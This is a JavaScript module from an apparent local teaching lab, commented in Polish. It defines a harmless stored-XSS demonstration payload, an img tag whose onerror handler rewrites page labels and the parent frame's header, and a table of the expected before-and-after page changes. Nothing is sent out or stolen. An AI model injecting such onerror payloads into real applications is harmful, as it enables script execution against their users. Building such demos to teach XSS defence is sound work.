// Kontrolowany payload lokalnego laboratorium. Ten sam kod pokazujemy w UI i Postmanie.
const script = `document.body.classList.add('compromised');
document.getElementById('effect').textContent = 'ATAK XSS: kod z opisu zmienił tę stronę';
document.getElementById('demo-priority').textContent = 'KRYTYCZNY — zmiana przez XSS';
document.getElementById('demo-owner').textContent = 'Kontrolowany payload XSS';
document.getElementById('demo-action').textContent = 'Przycisk zmieniony przez XSS';
if (parent !== window) {
  const header = parent.document.getElementById('app-header');
  const banner = parent.document.getElementById('xss-page-impact');
  if (header) header.classList.add('xss-header');
  if (banner) {
    banner.hidden = false;
    banner.textContent = 'DEMO XSS: skrypt zapisany w opisie zmienił nagłówek aplikacji i ten komunikat.';
  }
}
parent.postMessage('XSS_EXECUTED', location.origin);`;
// Atrybut jest ujęty w cudzysłowy; kod używa apostrofów.
const payload = `<img src="/lab/missing-image" onerror="${script}">`;
const baseline = {
 title: 'Oryginalna strona zgłoszenia',
 priority: 'Normalny',
 owner: 'Dział IT',
 action: 'Wyślij zgłoszenie',
 bodyClass: 'demo-document',
};
const changes = [
 {selector:'#effect',label:'Tytuł podglądu',before:baseline.title,after:'ATAK XSS: kod z opisu zmienił tę stronę'},
 {selector:'#demo-priority',label:'Priorytet w podglądzie',before:baseline.priority,after:'KRYTYCZNY — zmiana przez XSS'},
 {selector:'#demo-owner',label:'Opiekun w podglądzie',before:baseline.owner,after:'Kontrolowany payload XSS'},
 {selector:'#demo-action',label:'Tekst przycisku',before:baseline.action,after:'Przycisk zmieniony przez XSS'},
 {selector:'body',label:'Wygląd podglądu',before:baseline.bodyClass,after:'demo-document compromised'},
];
module.exports={script,payload,baseline,changes};
